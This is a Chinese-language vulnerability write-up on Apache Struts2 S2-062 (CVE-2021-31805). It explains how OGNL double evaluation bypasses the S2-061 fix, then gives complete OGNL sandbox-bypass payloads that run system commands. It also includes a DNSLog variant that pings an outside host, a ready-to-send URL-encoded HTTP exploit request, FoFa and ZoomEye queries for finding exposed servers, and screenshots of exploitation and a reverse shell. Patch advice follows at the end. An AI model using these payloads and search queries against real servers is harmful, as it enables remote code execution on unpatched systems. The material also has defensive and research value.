# 简介

2022年4月12日，Apache发布安全公告，修复了一个Apache Struts2
中的远程代码执行漏洞S2-062（CVE-2021-31805），攻击者可以利用此漏洞来控制受影响的系统。该漏洞是由于 2020 年
S2-061（CVE-2020-17530）的不完整修复造成的，当开发人员使用了 `%{…}
`语法进行强制`OGNL`解析时，仍有一些特殊的TAG属性可被二次解析，攻击者可构造恶意的`OGNL`表达式触发漏洞，从而实现远程代码执行。

# 影响范围

`2.0.0 <= Apache Struts2 <= 2.5.29`

# 搜索语法

## FoFa

`app="Struts2"`

## ZoomEye

`app:"Struts2"`

`app:"Apache Struts2"`

# 漏洞分析

与 S2-059 的示例非常相似，开发人员使用语法`%{}`定义属性的值，以使该页面动态并引入 url 参数。例如，如果将 url
参数`skillName`传递给页面，通常访问`https://<domain>/?skillName=abctest`,后端代码执行单次 `OGNL
`解析，以检索 GET 参数传入的数据

    
    
    <s:url action="list" namespace="/employee" var="url">
    <s:a href="%{url}" id="%{skillName}">List available Employees</s:a>
    </s:url>
    

但当用户传入的数据执行两次 `OGNL `解析时，就会存在漏洞。
当访问`https://<domain>/?skillName=%{3*3}`时，后端将执行两次`OGNL`解析，从而导致`id=9`。

S2-061的修复`https://github.com/apache/struts/commit/0a75d8e8fa3e75d538fb0fcbc75473bdbff9209e`,主要集中在`UIBean
`类。两个 `OGNL `评估之一发生在 `setId `函数期间，当它调用 `findString(id) `并添加递归检查以不进行 `OGNL `解析。

![image](https://image.3001.net/images/20220420/1650390244_625ef4e456f5a463969de.png!small)

它在局部变量`name`上调用 `completeExpressionIfAltSyntax `并将其分配给 `expr`，但在最终`OGNL
`解析局部变量`expr`之前对局部变量`name`进行了递归检查。

![image](https://image.3001.net/images/20220420/1650390268_625ef4fc67af380cde202.png!small)

但是如果不对局部变量`name`进行第二次 `OGNL `解析，`name `将不会包含用户提供的来自 URL
参数的数据。然而在`evaluateParams`函数中执行了另一个 `OGNL `解析。

![image](https://image.3001.net/images/20220420/1650390283_625ef50be287c828cdaf1.png!small)

这意味着对于某些 `UIBean `标记的名称属性很容易受到两次 `OGNL`解析，如果它们不包含值参数， 则可能导致远程代码执行。

有一些非常有才华的研究人员发现，您可以使用以下方法绕过 `OGNL/Struts`沙盒限制：

    
    
    #application.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')
    

创建一个 `BeanMap`并使用它的[setBean](https://commons.apache.org/proper/commons-beanutils/apidocs/org/apache/commons/beanutils/BeanMap.html#setBean-java.lang.Object- "setBean")和[put](https://commons.apache.org/proper/commons-beanutils/apidocs/org/apache/commons/beanutils/BeanMap.html#put-java.lang.Object-java.lang.Object- "put")函数来清除`excludedPackageNames
和excludedClasses `从而取消沙箱限制，但是新的沙盒限制阻止了 `org.apache.tomcat.* `的使用：

![image](https://image.3001.net/images/20220420/1650390308_625ef524e6e570e785235.png!small)

可以创建自定义`Map`类，也可以创建一个 `BeanMap`对象。之前创建 `BeanMap `的方法是：

    
    
    #application.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')
    

现在可以通过更简单的方法创建：

    
    
    #@org.apache.commons.collections.BeanMap@{}
    

使用 `org.apache.commons.collections.BeanMap `没有任何沙盒限制，因此通过使用特殊的`OGNL
`语法直接创建就可以绕过所有以前的沙盒限制。Payload如下（在S2-061的基础上去掉`%{}`）：

    
    
    (#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'}))
    

# 漏洞检测

  * 算术运行/预期字符串/MD5

    
    
    有回显的情况下，使用3*3，?id=+'test'+%2b+(2000+%2b+20).toString()，使用Payload执行echo $str1$str2，expr 123 + 123等方式
    

  * DNSLog

    
    
    (#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'ping xxx.dnslog.xx'}))
    

  * 命令执行

    
    
    (#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'}))
    

# 漏洞复现

漏洞环境docker-compose.yml：

    
    
    version: '2'
    services:
     struts2:
       image: vulhub/struts2:2.5.25
       ports:
        - "58080:8080"
    

测试数据包：

    
    
    POST / HTTP/1.1
    Host: x.x.x.x:58080
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: JSESSIONID=node01s6jfwzu7jiaso84yeylhndzq2863.node0
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 1045
    
    id=%25{(%23request.map%3d%23%40org.apache.commons.collections.BeanMap%40{}).toString().substring(0,0)+%2b(%23request.map.setBean(%23request.get('struts.valueStack'))+%3d%3d+true).toString().substring(0,0)+%2b(%23request.map2%3d%23%40org.apache.commons.collections.BeanMap%40{}).toString().substring(0,0)+%2b(%23request.map2.setBean(%23request.get('map').get('context'))+%3d%3d+true).toString().substring(0,0)+%2b(%23request.map3%3d%23%40org.apache.commons.collections.BeanMap%40{}).toString().substring(0,0)+%2b(%23request.map3.setBean(%23request.get('map2').get('memberAccess'))+%3d%3d+true).toString().substring(0,0)+%2b(%23request.get('map3').put('excludedPackageNames',%23%40org.apache.commons.collections.BeanMap%40{}.keySet())+%3d%3d+true).toString().substring(0,0)+%2b(%23request.get('map3').put('excludedClasses',%23%40org.apache.commons.collections.BeanMap%40{}.keySet())+%3d%3d+true).toString().substring(0,0)+%2b(%23application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'}))}
    

测试结果：

![image](https://image.3001.net/images/20220420/1650390359_625ef55795d33ca122901.png!small)

# Pocsuite

检测代码：  
![image](https://image.3001.net/images/20220420/1650390374_625ef56674c7d0baaadda.jpg!small)

漏洞检测：

![image](https://image.3001.net/images/20220420/1650390391_625ef577518eaa58140e5.png!small)

漏洞利用：

![image](https://image.3001.net/images/20220420/1650390411_625ef58bc0291569b1f26.png!small)

反弹shell：

![image](https://image.3001.net/images/20220420/1650390425_625ef599c0103edeed511.png!small)

# Xray

![image](https://image.3001.net/images/20220420/1650390602_625ef64aa21219960ea70.png!small)

# 修复建议

  1. 禁用`org.apache.commons.collection.BeanMap`

  2. 升级到2.5.29以上

